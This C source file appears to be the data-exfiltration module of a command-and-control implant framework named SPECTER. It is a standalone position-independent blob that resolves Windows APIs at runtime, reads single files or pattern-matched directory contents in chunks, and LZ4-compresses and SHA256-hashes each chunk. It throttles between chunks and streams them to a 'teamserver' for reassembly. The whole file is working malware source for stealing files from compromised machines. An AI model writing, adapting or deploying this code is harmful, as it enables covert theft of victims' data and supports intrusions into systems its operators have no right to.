/**
 * SPECTER Module — Data Exfiltration
 *
 * Chunked file and directory exfiltration with LZ4 compression,
 * per-chunk SHA256 integrity, and configurable throttling.
 *
 * Subcommands:
 *   "file"      <path> [chunk_size] [throttle_ms]
 *       Read file in chunks, LZ4 compress, SHA256 hash per chunk,
 *       output via bus->output() with chunk metadata.
 *
 *   "directory"  <dir> <pattern> <recursive> [chunk_size] [throttle_ms]
 *       List + filter directory entries, exfil each matching file.
 *
 * Output format per chunk (binary):
 *   [4B chunk_idx][4B total_chunks][4B compressed_len][4B original_len]
 *   [32B sha256][compressed_data...]
 *
 * Teamserver reassembles chunks and verifies integrity.
 *
 * Build: make modules  (produces build/modules/exfil.bin)
 */

#include "module.h"

/* ------------------------------------------------------------------ */
/*  Inline CRT primitives (modules are standalone PIC blobs)           */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s)
{
    SIZE_T len = 0;
    while (s[len]) len++;
    return len;
}

int spec_strcmp(const char *a, const char *b)
{
    while (*a && (*a == *b)) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

void *spec_memset(void *dst, int c, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    while (n--) *d++ = (BYTE)c;
    return dst;
}

void *spec_memcpy(void *dst, const void *src, SIZE_T n)
{
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (n--) *d++ = *s++;
    return dst;
}

/* ------------------------------------------------------------------ */
/*  Constants                                                          */
/* ------------------------------------------------------------------ */

#define DEFAULT_CHUNK_SIZE      (32 * 1024)   /* 32 KB per chunk        */
#define DEFAULT_THROTTLE_MS     100           /* ms between chunks      */
#define MAX_CHUNK_SIZE          (256 * 1024)  /* 256 KB max chunk       */
#define MIN_CHUNK_SIZE          1024          /* 1 KB minimum           */
#define MAX_PATH_LEN            520
#define MAX_PATTERN_LEN         128
#define FILE_LIST_BUF_SIZE      8192

/* Chunk header sizes */
#define CHUNK_META_SIZE         (4 + 4 + 4 + 4 + 32)  /* 48 bytes     */

/* File access constants */
#define GENERIC_READ            0x80000000
#define FILE_SHARE_READ         0x00000001
#define OPEN_EXISTING           3
#define FILE_ATTRIBUTE_NORMAL   0x00000080
#define INVALID_FILE_SIZE       0xFFFFFFFF
#define FILE_BEGIN              0

/* Memory permissions */
#define PAGE_READWRITE          0x04

/* SHA256 constants */
#define SHA256_BLOCK_SIZE       64
#define SHA256_DIGEST_SIZE      32

/* LZ4 constants */
#define LZ4_MAX_INPUT_SIZE      0x7E000000
#define LZ4_HASH_LOG            12
#define LZ4_HASH_SIZE           (1 << LZ4_HASH_LOG)
#define LZ4_SKIP_TRIGGER        6
#define LZ4_MIN_MATCH           4
#define LZ4_LAST_LITERALS       5
#define LZ4_MF_LIMIT            (LZ4_MIN_MATCH + 1)

/* FindFile constants */
#define FILE_ATTRIBUTE_DIRECTORY    0x00000010
#define INVALID_HANDLE              ((HANDLE)(ULONG_PTR)-1)
#define MAX_FIND_DATA_SIZE          592  /* WIN32_FIND_DATAA size */

/* ------------------------------------------------------------------ */
/*  Function pointer typedefs                                          */
/* ------------------------------------------------------------------ */

typedef HANDLE (*FN_CreateFileA)(
    const char *lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
    PVOID lpSecurityAttributes, DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes, HANDLE hTemplateFile
);

typedef BOOL (*FN_ReadFile)(
    HANDLE hFile, PVOID lpBuffer, DWORD nNumberOfBytesToRead,
    PDWORD lpNumberOfBytesRead, PVOID lpOverlapped
);

typedef DWORD (*FN_GetFileSize)(HANDLE hFile, PDWORD lpFileSizeHigh);

typedef DWORD (*FN_SetFilePointer)(
    HANDLE hFile, LONG lDistanceToMove,
    PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod
);

typedef BOOL (*FN_CloseHandle)(HANDLE hObject);

typedef void (*FN_Sleep)(DWORD dwMilliseconds);

typedef HANDLE (*FN_FindFirstFileA)(
    const char *lpFileName, PVOID lpFindFileData
);

typedef BOOL (*FN_FindNextFileA)(HANDLE hFindFile, PVOID lpFindFileData);

typedef BOOL (*FN_FindClose)(HANDLE hFindFile);

/* ------------------------------------------------------------------ */
/*  WIN32_FIND_DATAA structure (manual, packed)                        */
/* ------------------------------------------------------------------ */

#pragma pack(push, 1)
typedef struct _FILETIME_S {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME_S;

typedef struct _WIN32_FIND_DATAA_S {
    DWORD    dwFileAttributes;
    FILETIME_S ftCreationTime;
    FILETIME_S ftLastAccessTime;
    FILETIME_S ftLastWriteTime;
    DWORD    nFileSizeHigh;
    DWORD    nFileSizeLow;
    DWORD    dwReserved0;
    DWORD    dwReserved1;
    char     cFileName[260];
    char     cAlternateFileName[14];
} WIN32_FIND_DATAA_S;
#pragma pack(pop)

/* ------------------------------------------------------------------ */
/*  Helper: append string to buffer                                    */
/* ------------------------------------------------------------------ */

static DWORD buf_append(char *buf, DWORD buf_len, DWORD offset,
                         const char *str)
{
    while (*str && offset < buf_len - 1)
        buf[offset++] = *str++;
    buf[offset] = '\0';
    return offset;
}

/* ------------------------------------------------------------------ */
/*  Helper: uint to decimal string                                     */
/* ------------------------------------------------------------------ */

static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_len)
{
    char tmp[16];
    DWORD i = 0, j;

    if (buf_len < 2)
        return 0;

    if (val == 0) {
        buf[0] = '0';
        buf[1] = '\0';
        return 1;
    }

    while (val > 0 && i < sizeof(tmp) - 1) {
        tmp[i++] = (char)('0' + (val % 10));
        val /= 10;
    }

    if (i >= buf_len)
        i = buf_len - 1;

    for (j = 0; j < i; j++)
        buf[j] = tmp[i - 1 - j];
    buf[i] = '\0';

    return i;
}

static DWORD buf_append_uint(char *buf, DWORD buf_len, DWORD offset,
                              DWORD val)
{
    char tmp[16];
    uint_to_str(val, tmp, sizeof(tmp));
    return buf_append(buf, buf_len, offset, tmp);
}

/* ------------------------------------------------------------------ */
/*  Minimal SHA256 implementation (standalone, no imports)              */
/* ------------------------------------------------------------------ */

static const DWORD sha256_k[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

#define SHA_ROTR(x, n)  (((x) >> (n)) | ((x) << (32 - (n))))
#define SHA_CH(x,y,z)   (((x) & (y)) ^ ((~(x)) & (z)))
#define SHA_MAJ(x,y,z)  (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define SHA_EP0(x)       (SHA_ROTR(x, 2) ^ SHA_ROTR(x, 13) ^ SHA_ROTR(x, 22))
#define SHA_EP1(x)       (SHA_ROTR(x, 6) ^ SHA_ROTR(x, 11) ^ SHA_ROTR(x, 25))
#define SHA_SIG0(x)      (SHA_ROTR(x, 7) ^ SHA_ROTR(x, 18) ^ ((x) >> 3))
#define SHA_SIG1(x)      (SHA_ROTR(x, 17) ^ SHA_ROTR(x, 19) ^ ((x) >> 10))

typedef struct _SHA256_CTX {
    DWORD state[8];
    BYTE  block[64];
    DWORD block_len;
    QWORD total_len;
} SHA256_CTX;

static void sha256_transform(SHA256_CTX *ctx)
{
    DWORD w[64];
    DWORD a, b, c, d, e, f, g, h, t1, t2;
    DWORD i;

    for (i = 0; i < 16; i++) {
        w[i] = ((DWORD)ctx->block[i*4] << 24) |
               ((DWORD)ctx->block[i*4+1] << 16) |
               ((DWORD)ctx->block[i*4+2] << 8) |
               ((DWORD)ctx->block[i*4+3]);
    }
    for (i = 16; i < 64; i++)
        w[i] = SHA_SIG1(w[i-2]) + w[i-7] + SHA_SIG0(w[i-15]) + w[i-16];

    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];

    for (i = 0; i < 64; i++) {
        t1 = h + SHA_EP1(e) + SHA_CH(e,f,g) + sha256_k[i] + w[i];
        t2 = SHA_EP0(a) + SHA_MAJ(a,b,c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void sha256_init(SHA256_CTX *ctx)
{
    ctx->state[0] = 0x6a09e667; ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372; ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f; ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab; ctx->state[7] = 0x5be0cd19;
    ctx->block_len = 0;
    ctx->total_len = 0;
}

static void sha256_update(SHA256_CTX *ctx, const BYTE *data, DWORD len)
{
    DWORD i;
    for (i = 0; i < len; i++) {
        ctx->block[ctx->block_len++] = data[i];
        if (ctx->block_len == 64) {
            sha256_transform(ctx);
            ctx->block_len = 0;
            ctx->total_len += 512;
        }
    }
}

static void sha256_final(SHA256_CTX *ctx, BYTE digest[32])
{
    DWORD i = ctx->block_len;
    QWORD total;

    ctx->block[i++] = 0x80;
    if (i > 56) {
        while (i < 64) ctx->block[i++] = 0;
        sha256_transform(ctx);
        i = 0;
    }
    while (i < 56) ctx->block[i++] = 0;

    total = ctx->total_len + (QWORD)ctx->block_len * 8;
    ctx->block[56] = (BYTE)(total >> 56);
    ctx->block[57] = (BYTE)(total >> 48);
    ctx->block[58] = (BYTE)(total >> 40);
    ctx->block[59] = (BYTE)(total >> 32);
    ctx->block[60] = (BYTE)(total >> 24);
    ctx->block[61] = (BYTE)(total >> 16);
    ctx->block[62] = (BYTE)(total >> 8);
    ctx->block[63] = (BYTE)(total);
    sha256_transform(ctx);

    for (i = 0; i < 8; i++) {
        digest[i*4]   = (BYTE)(ctx->state[i] >> 24);
        digest[i*4+1] = (BYTE)(ctx->state[i] >> 16);
        digest[i*4+2] = (BYTE)(ctx->state[i] >> 8);
        digest[i*4+3] = (BYTE)(ctx->state[i]);
    }
}

/* ------------------------------------------------------------------ */
/*  Minimal LZ4 compressor (block format, standalone)                  */
/*                                                                     */
/*  Simplified single-pass LZ4 block compression for PIC use.          */
/*  No heap allocation — uses a static hash table on the stack.        */
/* ------------------------------------------------------------------ */

static DWORD lz4_write_len(BYTE *dst, DWORD len)
{
    DWORD written = 0;
    while (len >= 255) {
        dst[written++] = 255;
        len -= 255;
    }
    dst[written++] = (BYTE)len;
    return written;
}

static DWORD lz4_compress(const BYTE *src, DWORD src_len,
                           BYTE *dst, DWORD dst_cap)
{
    WORD hash_table[LZ4_HASH_SIZE];
    const BYTE *src_end = src + src_len;
    const BYTE *match_limit = src_end - LZ4_LAST_LITERALS;
    const BYTE *mf_limit = src_end - LZ4_MF_LIMIT;
    const BYTE *anchor = src;
    const BYTE *ip = src + 1;
    BYTE *op = dst;
    BYTE *op_limit = dst + dst_cap;
    DWORD h, step, skip;

    if (src_len == 0) return 0;
    if (src_len > LZ4_MAX_INPUT_SIZE) return 0;

    spec_memset(hash_table, 0, sizeof(hash_table));

    /* Hash the first position */
    h = ((*(const DWORD *)src) * 2654435761U) >> (32 - LZ4_HASH_LOG);
    hash_table[h] = 0;

    while (ip < mf_limit) {
        const BYTE *ref;
        DWORD match_len, lit_len, token;

        /* Find a match */
        step = 1;
        skip = 0;
        do {
            h = ((*(const DWORD *)ip) * 2654435761U) >> (32 - LZ4_HASH_LOG);
            ref = src + hash_table[h];
            hash_table[h] = (WORD)(ip - src);
            if (ip - ref > 0xFFFF) {
                ip++;
                skip++;
                if (skip >= LZ4_SKIP_TRIGGER) step++;
                continue;
            }
            if (*(const DWORD *)ref == *(const DWORD *)ip)
                break;
            ip += step;
            skip++;
            if (skip >= LZ4_SKIP_TRIGGER) step++;
        } while (ip < mf_limit);

        if (ip >= mf_limit)
            break;

        /* Encode literal length */
        lit_len = (DWORD)(ip - anchor);

        /* Count match length */
        {
            const BYTE *mp = ip + LZ4_MIN_MATCH;
            const BYTE *mr = ref + LZ4_MIN_MATCH;
            while (mp < match_limit && *mp == *mr) { mp++; mr++; }
            match_len = (DWORD)(mp - ip - LZ4_MIN_MATCH);
        }

        /* Check output space */
        {
            DWORD needed = 1 + (lit_len >= 15 ? lit_len / 255 + 1 : 0) +
                           lit_len + 2 +
                           (match_len >= 15 ? match_len / 255 + 1 : 0);
            if (op + needed > op_limit)
                return 0; /* Output buffer too small */
        }

        /* Token byte */
        token = (lit_len >= 15 ? 15 : lit_len) << 4;
        token |= (match_len >= 15 ? 15 : match_len);
        *op++ = (BYTE)token;

        /* Extra literal length bytes */
        if (lit_len >= 15)
            op += lz4_write_len(op, lit_len - 15);

        /* Literal bytes */
        spec_memcpy(op, anchor, lit_len);
        op += lit_len;

        /* Offset (little-endian 16-bit) */
        {
            WORD offset_val = (WORD)(ip - ref);
            *op++ = (BYTE)(offset_val & 0xFF);
            *op++ = (BYTE)(offset_val >> 8);
        }

        /* Extra match length bytes */
        if (match_len >= 15)
            op += lz4_write_len(op, match_len - 15);

        /* Advance past match */
        ip += match_len + LZ4_MIN_MATCH;
        anchor = ip;
    }

    /* Last literals */
    {
        DWORD last_lit = (DWORD)(src_end - anchor);
        DWORD needed = 1 + (last_lit >= 15 ? last_lit / 255 + 1 : 0) + last_lit;
        if (op + needed > op_limit)
            return 0;

        BYTE token = (BYTE)((last_lit >= 15 ? 15 : last_lit) << 4);
        *op++ = token;
        if (last_lit >= 15)
            op += lz4_write_len(op, last_lit - 15);
        spec_memcpy(op, anchor, last_lit);
        op += last_lit;
    }

    return (DWORD)(op - dst);
}

/* ------------------------------------------------------------------ */
/*  Helper: simple wildcard pattern matching (*, ?)                    */
/* ------------------------------------------------------------------ */

static BOOL pattern_match(const char *pattern, const char *str)
{
    while (*pattern && *str) {
        if (*pattern == '*') {
            pattern++;
            if (*pattern == '\0') return TRUE;
            while (*str) {
                if (pattern_match(pattern, str))
                    return TRUE;
                str++;
            }
            return FALSE;
        }
        if (*pattern == '?') {
            pattern++;
            str++;
            continue;
        }
        /* Case-insensitive compare */
        {
            char a = *pattern, b = *str;
            if (a >= 'A' && a <= 'Z') a += 0x20;
            if (b >= 'A' && b <= 'Z') b += 0x20;
            if (a != b) return FALSE;
        }
        pattern++;
        str++;
    }
    while (*pattern == '*') pattern++;
    return (*pattern == '\0' && *str == '\0');
}

/* ------------------------------------------------------------------ */
/*  Helper: build path by joining dir + separator + filename           */
/* ------------------------------------------------------------------ */

static DWORD path_join(char *out, DWORD out_len,
                        const char *dir, const char *name)
{
    DWORD off = 0;
    off = buf_append(out, out_len, off, dir);
    if (off > 0 && out[off - 1] != '\\' && out[off - 1] != '/')
        off = buf_append(out, out_len, off, "\\");
    off = buf_append(out, out_len, off, name);
    return off;
}

/* ------------------------------------------------------------------ */
/*  Core: exfiltrate a single file in compressed, hashed chunks        */
/* ------------------------------------------------------------------ */

static DWORD exfil_single_file(MODULE_BUS_API *api,
                                const char *path,
                                DWORD chunk_size,
                                DWORD throttle_ms)
{
    FN_CreateFileA  pCreateFileA;
    FN_ReadFile     pReadFile;
    FN_GetFileSize  pGetFileSize;
    FN_CloseHandle  pCloseHandle;
    FN_Sleep        pSleep;
    HANDLE hFile;
    DWORD file_size, file_size_high;
    DWORD total_chunks, chunk_idx;
    BYTE *read_buf = NULL;
    BYTE *comp_buf = NULL;
    DWORD comp_cap;
    DWORD bytes_read;
    BYTE *out_buf = NULL;

    /* Resolve APIs */
    pCreateFileA = (FN_CreateFileA)api->resolve("kernel32.dll", "CreateFileA");
    pReadFile    = (FN_ReadFile)api->resolve("kernel32.dll", "ReadFile");
    pGetFileSize = (FN_GetFileSize)api->resolve("kernel32.dll", "GetFileSize");
    pCloseHandle = (FN_CloseHandle)api->resolve("kernel32.dll", "CloseHandle");
    pSleep       = (FN_Sleep)api->resolve("kernel32.dll", "Sleep");

    if (!pCreateFileA || !pReadFile || !pGetFileSize || !pCloseHandle) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to resolve file APIs");
        return MODULE_ERR_RESOLVE;
    }

    /* Open file */
    hFile = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                          NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile || hFile == INVALID_HANDLE_VALUE) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to open file");
        return MODULE_ERR_IO;
    }

    /* Get file size */
    file_size_high = 0;
    file_size = pGetFileSize(hFile, &file_size_high);
    if (file_size == INVALID_FILE_SIZE || file_size_high != 0) {
        /* File too large (>4GB) or error */
        if (file_size_high != 0) {
            MODULE_OUTPUT_ERROR(api, "exfil: file too large (>4GB)");
            pCloseHandle(hFile);
            return MODULE_ERR_IO;
        }
    }

    if (file_size == 0) {
        MODULE_OUTPUT_TEXT(api, "exfil: file is empty, nothing to exfil");
        pCloseHandle(hFile);
        return MODULE_SUCCESS;
    }

    /* Clamp chunk size */
    if (chunk_size < MIN_CHUNK_SIZE) chunk_size = MIN_CHUNK_SIZE;
    if (chunk_size > MAX_CHUNK_SIZE) chunk_size = MAX_CHUNK_SIZE;

    /* Calculate total chunks */
    total_chunks = (file_size + chunk_size - 1) / chunk_size;

    /* Allocate read buffer */
    read_buf = (BYTE *)api->mem_alloc((SIZE_T)chunk_size, PAGE_READWRITE);
    if (!read_buf) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to alloc read buffer");
        pCloseHandle(hFile);
        return MODULE_ERR_ALLOC;
    }

    /* Allocate compression buffer (LZ4 worst case: input + input/255 + 16) */
    comp_cap = chunk_size + (chunk_size / 255) + 16;
    comp_buf = (BYTE *)api->mem_alloc((SIZE_T)comp_cap, PAGE_READWRITE);
    if (!comp_buf) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to alloc compression buffer");
        api->mem_free(read_buf);
        pCloseHandle(hFile);
        return MODULE_ERR_ALLOC;
    }

    /* Allocate output buffer (metadata + max compressed data) */
    out_buf = (BYTE *)api->mem_alloc((SIZE_T)(CHUNK_META_SIZE + comp_cap),
                                      PAGE_READWRITE);
    if (!out_buf) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to alloc output buffer");
        api->mem_free(comp_buf);
        api->mem_free(read_buf);
        pCloseHandle(hFile);
        return MODULE_ERR_ALLOC;
    }

    /* Send start marker */
    {
        char msg[256];
        DWORD off = 0;
        off = buf_append(msg, sizeof(msg), off, "exfil: starting ");
        off = buf_append(msg, sizeof(msg), off, path);
        off = buf_append(msg, sizeof(msg), off, " (");
        off = buf_append_uint(msg, sizeof(msg), off, file_size);
        off = buf_append(msg, sizeof(msg), off, " bytes, ");
        off = buf_append_uint(msg, sizeof(msg), off, total_chunks);
        off = buf_append(msg, sizeof(msg), off, " chunks)");
        MODULE_OUTPUT_TEXT(api, msg);
    }

    /* Read and exfiltrate each chunk */
    for (chunk_idx = 0; chunk_idx < total_chunks; chunk_idx++) {
        DWORD to_read = chunk_size;
        DWORD remaining = file_size - (chunk_idx * chunk_size);
        DWORD comp_len;
        SHA256_CTX sha_ctx;
        BYTE digest[SHA256_DIGEST_SIZE];
        const BYTE *payload_data;
        DWORD payload_len;

        if (remaining < to_read)
            to_read = remaining;

        /* Read chunk from file */
        bytes_read = 0;
        if (!pReadFile(hFile, read_buf, to_read, &bytes_read, NULL) ||
            bytes_read == 0) {
            MODULE_OUTPUT_ERROR(api, "exfil: ReadFile failed");
            break;
        }

        /* LZ4 compress */
        comp_len = lz4_compress(read_buf, bytes_read, comp_buf, comp_cap);

        /* Use compressed data if it's smaller, otherwise send raw */
        if (comp_len > 0 && comp_len < bytes_read) {
            payload_data = comp_buf;
            payload_len = comp_len;
        } else {
            /* Compression didn't help — send uncompressed */
            payload_data = read_buf;
            payload_len = bytes_read;
            comp_len = 0;  /* Signal: 0 means not compressed */
        }

        /* SHA256 of the compressed (or raw) payload */
        sha256_init(&sha_ctx);
        sha256_update(&sha_ctx, payload_data, payload_len);
        sha256_final(&sha_ctx, digest);

        /* Build output: [chunk_idx][total_chunks][compressed_len][original_len][sha256][data] */
        {
            DWORD *meta = (DWORD *)out_buf;
            meta[0] = chunk_idx;
            meta[1] = total_chunks;
            meta[2] = comp_len;          /* 0 if uncompressed */
            meta[3] = bytes_read;        /* original chunk size */
            spec_memcpy(out_buf + 16, digest, SHA256_DIGEST_SIZE);
            spec_memcpy(out_buf + CHUNK_META_SIZE, payload_data, payload_len);
        }

        /* Output via bus */
        MODULE_OUTPUT_BINARY(api, out_buf, CHUNK_META_SIZE + payload_len);

        /* Throttle between chunks */
        if (pSleep && throttle_ms > 0 && chunk_idx + 1 < total_chunks)
            pSleep(throttle_ms);
    }

    /* Cleanup */
    api->mem_free(out_buf);
    api->mem_free(comp_buf);
    api->mem_free(read_buf);
    pCloseHandle(hFile);

    /* Send completion marker */
    {
        char msg[128];
        DWORD off = 0;
        off = buf_append(msg, sizeof(msg), off, "exfil: completed ");
        off = buf_append_uint(msg, sizeof(msg), off, chunk_idx);
        off = buf_append(msg, sizeof(msg), off, "/");
        off = buf_append_uint(msg, sizeof(msg), off, total_chunks);
        off = buf_append(msg, sizeof(msg), off, " chunks");
        MODULE_OUTPUT_TEXT(api, msg);
    }

    return (chunk_idx == total_chunks) ? MODULE_SUCCESS : MODULE_ERR_IO;
}

/* ------------------------------------------------------------------ */
/*  Subcommand: file — exfiltrate a single file                        */
/* ------------------------------------------------------------------ */

static DWORD cmd_file(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    const char *path;
    DWORD chunk_size;
    DWORD throttle_ms;

    /* arg[0] = "file", arg[1] = path, arg[2] = chunk_size, arg[3] = throttle_ms */
    path = module_arg_string(args, 1);
    if (!path) {
        MODULE_OUTPUT_ERROR(api, "exfil file: usage: file <path> [chunk_size] [throttle_ms]");
        return MODULE_ERR_ARGS;
    }

    chunk_size  = module_arg_int32(args, 2, DEFAULT_CHUNK_SIZE);
    throttle_ms = module_arg_int32(args, 3, DEFAULT_THROTTLE_MS);

    return exfil_single_file(api, path, chunk_size, throttle_ms);
}

/* ------------------------------------------------------------------ */
/*  Subcommand: directory — exfil matching files in a directory         */
/* ------------------------------------------------------------------ */

static DWORD cmd_directory(MODULE_BUS_API *api, const MODULE_ARGS *args)
{
    FN_FindFirstFileA pFindFirstFileA;
    FN_FindNextFileA  pFindNextFileA;
    FN_FindClose      pFindClose;

    const char *dir;
    const char *pattern;
    DWORD recursive;
    DWORD chunk_size;
    DWORD throttle_ms;
    DWORD files_sent = 0;
    DWORD result = MODULE_SUCCESS;

    /* arg[0]="directory", arg[1]=dir, arg[2]=pattern, arg[3]=recursive,
       arg[4]=chunk_size, arg[5]=throttle_ms */
    dir       = module_arg_string(args, 1);
    pattern   = module_arg_string(args, 2);
    recursive = module_arg_int32(args, 3, 0);
    chunk_size  = module_arg_int32(args, 4, DEFAULT_CHUNK_SIZE);
    throttle_ms = module_arg_int32(args, 5, DEFAULT_THROTTLE_MS);

    if (!dir || !pattern) {
        MODULE_OUTPUT_ERROR(api, "exfil directory: usage: directory <dir> <pattern> <recursive> [chunk_size] [throttle_ms]");
        return MODULE_ERR_ARGS;
    }

    /* Resolve FindFile APIs */
    pFindFirstFileA = (FN_FindFirstFileA)api->resolve("kernel32.dll", "FindFirstFileA");
    pFindNextFileA  = (FN_FindNextFileA)api->resolve("kernel32.dll", "FindNextFileA");
    pFindClose      = (FN_FindClose)api->resolve("kernel32.dll", "FindClose");

    if (!pFindFirstFileA || !pFindNextFileA || !pFindClose) {
        MODULE_OUTPUT_ERROR(api, "exfil directory: failed to resolve FindFile APIs");
        return MODULE_ERR_RESOLVE;
    }

    {
        char search_path[MAX_PATH_LEN];
        WIN32_FIND_DATAA_S find_data;
        HANDLE hFind;

        /* Build search path: dir\* */
        path_join(search_path, sizeof(search_path), dir, "*");

        spec_memset(&find_data, 0, sizeof(find_data));
        hFind = pFindFirstFileA(search_path, &find_data);
        if (!hFind || hFind == INVALID_HANDLE) {
            MODULE_OUTPUT_ERROR(api, "exfil directory: FindFirstFile failed");
            return MODULE_ERR_IO;
        }

        do {
            /* Skip . and .. */
            if (find_data.cFileName[0] == '.') {
                if (find_data.cFileName[1] == '\0') continue;
                if (find_data.cFileName[1] == '.' && find_data.cFileName[2] == '\0')
                    continue;
            }

            if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                /* Recurse into subdirectory if requested */
                if (recursive) {
                    char subdir[MAX_PATH_LEN];
                    path_join(subdir, sizeof(subdir), dir, find_data.cFileName);

                    /* Build args for recursive call: reuse current params */
                    /* We call exfil on matching files in subdirectory by
                       doing manual enumeration (not re-entering module_entry) */
                    {
                        char sub_search[MAX_PATH_LEN];
                        WIN32_FIND_DATAA_S sub_find;
                        HANDLE hSubFind;

                        path_join(sub_search, sizeof(sub_search), subdir, "*");
                        spec_memset(&sub_find, 0, sizeof(sub_find));
                        hSubFind = pFindFirstFileA(sub_search, &sub_find);
                        if (hSubFind && hSubFind != INVALID_HANDLE) {
                            do {
                                if (sub_find.cFileName[0] == '.') continue;
                                if (!(sub_find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                                    if (pattern_match(pattern, sub_find.cFileName)) {
                                        char filepath[MAX_PATH_LEN];
                                        path_join(filepath, sizeof(filepath),
                                                  subdir, sub_find.cFileName);
                                        DWORD rc = exfil_single_file(api, filepath,
                                                                      chunk_size, throttle_ms);
                                        if (rc == MODULE_SUCCESS)
                                            files_sent++;
                                        else
                                            result = rc;
                                    }
                                }
                            } while (pFindNextFileA(hSubFind, &sub_find));
                            pFindClose(hSubFind);
                        }
                    }
                }
            } else {
                /* Regular file — check pattern match */
                if (pattern_match(pattern, find_data.cFileName)) {
                    char filepath[MAX_PATH_LEN];
                    path_join(filepath, sizeof(filepath), dir, find_data.cFileName);
                    DWORD rc = exfil_single_file(api, filepath,
                                                  chunk_size, throttle_ms);
                    if (rc == MODULE_SUCCESS)
                        files_sent++;
                    else
                        result = rc;
                }
            }
        } while (pFindNextFileA(hFind, &find_data));

        pFindClose(hFind);
    }

    /* Summary */
    {
        char msg[128];
        DWORD off = 0;
        off = buf_append(msg, sizeof(msg), off, "exfil directory: sent ");
        off = buf_append_uint(msg, sizeof(msg), off, files_sent);
        off = buf_append(msg, sizeof(msg), off, " file(s)");
        MODULE_OUTPUT_TEXT(api, msg);
    }

    return result;
}

/* ------------------------------------------------------------------ */
/*  Module entry point                                                 */
/* ------------------------------------------------------------------ */

DWORD module_entry(MODULE_BUS_API *api, BYTE *args_raw, DWORD args_len)
{
    MODULE_ARGS  args;
    const char  *subcmd;

    if (!module_parse_args(args_raw, args_len, &args)) {
        MODULE_OUTPUT_ERROR(api, "exfil: failed to parse arguments");
        return MODULE_ERR_ARGS;
    }

    subcmd = module_arg_string(&args, 0);
    if (!subcmd) {
        MODULE_OUTPUT_ERROR(api, "exfil: missing subcommand (file|directory)");
        return MODULE_ERR_ARGS;
    }

    if (spec_strcmp(subcmd, "file") == 0)
        return cmd_file(api, &args);

    if (spec_strcmp(subcmd, "directory") == 0)
        return cmd_directory(api, &args);

    MODULE_OUTPUT_ERROR(api, "exfil: unknown subcommand");
    return MODULE_ERR_UNSUPPORTED;
}
